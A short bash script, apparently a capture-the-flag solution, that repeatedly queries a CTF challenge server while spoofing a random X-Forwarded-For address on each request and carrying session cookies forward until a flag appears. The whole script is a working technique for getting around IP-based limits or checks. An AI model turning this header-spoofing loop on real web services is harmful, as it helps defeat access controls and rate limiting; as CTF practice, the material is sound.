#!/bin/bash
# Credit tecknicaltom 

COOKIE=""

while :
do
 OUT="$(curl -s -H "X-Forwarded-For: $(($RANDOM % 256)).$(($RANDOM % 256)).$(($RANDOM % 256)).$(($RANDOM % 256)):80" -H "Cookie: $COOKIE"  -v challenges.openctf.cat:9027 2>&1)"
 echo "$OUT"
 NEXT_COOKIE="$(echo "$OUT" | sed -n -e 's/.*Set-Cookie: \([^;]\+\).*/\1/p')"
 if [[ ! -z "$NEXT_COOKIE" ]]
 then
  COOKIE="$NEXT_COOKIE"
 fi
 echo "$OUT" | grep -q flag && exit
done
